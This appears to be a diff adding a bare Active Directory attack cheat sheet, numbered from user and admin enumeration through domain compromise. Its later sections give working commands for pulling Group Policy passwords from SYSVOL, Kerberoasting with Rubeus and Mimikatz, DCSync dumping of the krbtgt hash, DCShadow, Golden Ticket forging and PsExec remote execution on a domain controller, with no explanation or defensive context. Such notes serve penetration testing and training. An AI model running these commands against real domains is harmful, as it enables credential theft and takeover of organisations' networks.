@@ -1,0 +1,77 @@
+
+1.	Enumeration of users and domain admins
+POWERVIEW
+Get-NetUser 
+Get-NetGroup
+Get-NetGroup "Domain Admins" –Domain <domain>
+Get-NetGroup "Enterprise Admins" –Domain <domain>
+
+PowerShell AD Module
+Get-ADGroup -Filter * -Properties *
+Get-ADGroupMember -Identity "Domain Admins" –Recursive
+Get-ADGroupMember -Identity "Enterprise Admins" –Recursive
+
+PowerShell 
+([ADSISearcher]"(&(objectClass=user)(samAccountType=805306368))").FindAll()|ft
+([ADSISearcher]"ObjectClass=group").FindAll()
+([ADSISearcher]"(&(ObjectClass=group)(samaccountname=Domain  Admins))").FindAll()
+([ADSISearcher]"(&(ObjectClass=group)(samaccountname=Enterprise  Admins))").FindAll()
+
+2.	Enumeration of computers and domain controllers
+POWERVIEW
+Get-NetComputer
+Get-NetDomainController
+Get-NetDomainController -Domain <domain_forest>
+PowerShell AD Module
+Get-ADComputer -filter * -properties *
+Get-ADDomainController
+Get-ADDomainController -DomainName <domain_forest> -Discover
+PowerShell 
+([ADSISearcher]"ObjectClass=computer").FindAll()
+([ADSISearcher]"(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))").FindAll()
+
+
+nltest /dclist:DOMINIO
+netdom query /d:DOMINIO PDC
+nslookup -querytype=SRV _LDAP._TCP.DC._MSDCS.<domain_name>
+
+
+3.	Enumeration of SPN
+setspn -T <DC_hostname> -Q */*
+([ADSISearcher]"(&(objectClass=user)(servicePrincipalName=*)(samAccountType=805306368))").FindAll()
+
+
+4.	Enumeration of SMB sessions
+nmap -sU -sS --script smb-enum-sessions.nse -p U:137,T:139 <host>
+nmap --script smb-enum-sessions.nse -p445
+PowerView
+Get-NetLoggedon –computername <computer>
+
+
+5.	GPPPaswords
+findstr /S /I cpassword \\<FQDN>\sysvol\<FQDN>\policies\*.xml
+PowerSploit
+Get-GPPPassword
+
+6.	Kerberoasting
+Rubeus.exe kerberoast /outfile:hash.john.txt
+Invoke-Mimikatz
+kerberos::ask /target:<SPN>
+kerberos::list /export
+
+7.	DCSync
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
+
+8.	DCShadow
+Invoke-Mimikatz
+lsadump::dcshadow /object:username /attribute:Description /value="My new description"
+lsadump::dcshadow /push
+
+9.	Golden Ticket
+kerberos::golden /sid:<Domain SID> /domain:<Domain FQDN> /user:<The user to impersonate> /krbtgt:<The password hash of the KRBTGT account>
+
+10.	Remote Code execution
+PsExec64.exe \\dc01.domain.local cmd
+
+
+
